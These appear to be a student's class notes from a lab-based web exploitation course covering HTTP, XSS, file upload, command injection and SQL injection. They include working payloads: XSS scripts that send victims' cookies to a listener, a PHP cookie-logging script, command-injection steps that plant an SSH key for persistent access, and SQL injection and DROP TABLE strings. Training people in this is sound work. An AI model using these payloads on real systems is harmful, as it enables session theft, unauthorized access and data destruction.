Day 1
 - Server/Client Realtionship
    - Synchronous communications between user and services
    - Not all data is not returned, client only receives what is allowed
 - HTTP
    - Request/Response
       - Various tools to view
          - tcpdump
          - wireshark
          - Developer Console
    - Methods
       - Get
       - Post
       - Head
       - Put
    - Response Codes
       - 10x = Informational
       - 2xx = Success
       - 30x = Redirection
       - 4xx = Client Error
       - 5xx = Server Error
    - Packet headers
    - Fields
       - User-Agent
       - Referer
       - Cookie
       - Date
       - Server
       - Set-Cookie
    - Method notes
       - Get pulls from
       - Post posts to the server
       - wget
       - curl
       - JavaScript(JS)
          - Allows website to interact with the client
             - JavaScript runs on the clients machine
          - Coded as .JS files, or in-line of HTML
       - Dev Console
          - Enumeration
             - ROBOTS.TXT
             - Legitimate surfing
             - Tools:
                - NSE scripts
                - Nikto
                - Burp suite (outside class)
 - Cross-Site Scripting (XSS) Overview
    - Insertion of arbitrary code into a webpage, that executes in the browser of visistors
    - Unsanitized GET,POST,and PUT methods allow JS to be placed on websites
    - Often found in forums that allow HTML
    - Reflected XSS
       - Most common form of XSS
       - Transient, occurs in error messages or search results
       - Delivered through intermediate media, such as a link in an email
       - Characters that are normally illegal in URLs can be Base64 encoded
       - Example
          - http://example.com/page.php?name=dXNlcjEyMw
             - the server will decode as name=abc123
    - Stored XSS
       - Resides on vulnerable site
       - Only requires user to visit page
          - Useful JavaScript Components
             - Capturing Cookies
             - Capturing Keystrokes
                - bind KEYDOWN and KEYUP
             - Capturing sensitive data
    - Server-Side injection
       - Ability to read/execute outside web servers directory
       - Uses ../../(Relative paths) in manipulating server-side file path
    - Malicious File Upload
       - Server doesn't validate extension or size
       - Allows for code execution
       - Once uploaded
          - Find your file
          - Call your file
   - Command Injection
      - Application on ther server is vulnerable, allowing execution of arbitrary commands
         - User input not validated
            - Common example is a SOHO router, with a web page to allow ping
  - Demo
     - nmap --script=http-enum.nse
     - nikto -host 10.50.xx.xx
     - steal cookies
  1 <script>document.location="10.50.28.138:8000"+document.cookie;</script>
  2 
  3 python3 -m http.server      
       - Another cookie stealer:
  1 <?php
  2 $cookie = $_GET["username"];
  3 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
  4 fwrite($steal, $cookie ."\n");
  5 fclose($steal);
  6 ?>

       - To run the uploaded cookie stealer
          - <script>document.location="http://theSERVERIP/uploads/cookiestealer.php?username="+document.cookie;</script> 
       
       
       
       - How to send ssh public key using command injection
          - find the users home directory (user you have control over)
          - generate your rsa key (ssh-keygen -t rsa -b 4096)
          - cat .ssh/id_rsa.pub
          - copy all contents except the username@box
          - return to command injecton location
          - execute (;mkdir .ssh) make sure to specify absolute path
          - execute (;ls -la) to verify the directory was created
          - execute (;echo "copied rsa" > /var/www/.ssh/authorized_keys)
          - execute (;cat /var/www/.ssh/authorized_keys) to verify your key was added
          - when sshing to the box after this execute (ssh -i .ssh/id_rsa username@tgtip)
       
 Day 2 SQL
   - Ojectives
      - Familiarization with SQL queries
      - Perform SQL injections
      - Identify unsanitized input fields
   - SQL
      - Structured Query Language - ANSI standard
      - Additional commands added by vendors
      - Relational
   - Standard Commands (all commands end with a ';'
      - Select = extracts data from a database
      - Union = Used to combine the result-set of two or more select statements
      - Use = select the database to use
      - Update = updates data in a database
      - Delete = Deletes data from a database
      - Insert Into = Inserts new data into a database
      - Create Database = creates a database
      - Alter Database = Modifies a database
      - Create table = Creates a new table
      - Alter table = Modifies a table
      - Drop table = Deletes a table
      - Create index = Creates an index (search key)
      - Drop index = Deletes an index
      - Demo
         - show databases; = lists the databases
         - show tables from session; = shows all tables
         - select * from session.tires; = shows eveerything in the sessions database and tires table
         - select tireid,name,cost from session.tires; = queries specific information from the table
         - use session; = basically cd'ing into a database
         - select * from tires; = queries tires directly since you are in the sessions DB
         - show tables; = lists all tables directly in the DB you are in
         - select * from user; = lists everything from the user table
   - SQL Injection - Considerations
      - Requires Valid SQL Queries
      - Fully patched systems can be vulnerable due to misconfiguration
      - Input Field Sanitization
      - String vs. Integer values
      - Is INFORMATION_SCHEMA database available
      - Get requests versus POST Request HTTP methods
   - Unsanitized Vs Sanitized Fields
      - Unsanitized: input fields can be found using a single quote "'"
         - Will return extraneous information
         - ' closes a variable, to allow for additional statements/clauses
         - may show no errors or generic error (harder injection)
      - Sanitized: iput fields are checked for items that might harm the database(items are removed,escaped, or turned into a single string)
      - Validation: checks inputs to ensure it meets a criteria(string doesn't contain "'")
   - Server-Side query processing
      - User enters JOHNDOE243 in the name field and PASS1234$ in the pass field
      - The server side query that would be passed to MySQL from php would be
         - Before
            - select id from users where name='$name' AND pass='$pass'
         - After
            - select id from users where name='JohnDoe243' and pass='pass1234$'
   - Example - Injecting ypur statement
      - User enters TOM' OR 1='1 in the name and pass fields
         - server-side query would look like
            - select id from users where name='tom' or 1='1' and pass='tom' or 1='1'
   - SQL Injection Validation Demo
      - once you find the vulnerable field document it
      - post is sending it through the creds box
      - get is enetering something like " /login.php?username=Admin&passwd=user"
   - Union Demo
      - once you determine the post/get vulnerabilities make note of them
      - then write a union statement "10.50.42.112/uniondemo.php?Selection=2 union select 1,2,3"
      - query the information schema "http://10.50.42.112/uniondemo.php?Selection=2%20union%20select%20table_schema,%20table_name,%20column_name%20from%20information_schema.columns"
      - selection=2 union select table_schema,table_name,column_name from information_schema.columns
      
      
   - SQL by the numbers (MySQL)
      - Browse website to find 
      
      - Find the number of columns (union select 1,2,3)
      - Golden Statement = (union select table_schema,table_name,column_name from information_schema.columns)
         - 1 table_schema
         - 2 table_name
         - 3 column_name
      - Navigate to custom database(union select id,pass,name from session.user)
   - Stacking Statements
      - chaining multiple statements together using a semi-colon ';'
      - select * from user where id='Johnny';DROP TABLE Customers; --'
       
       
       
       
       
       
       
       
       
       
       
       
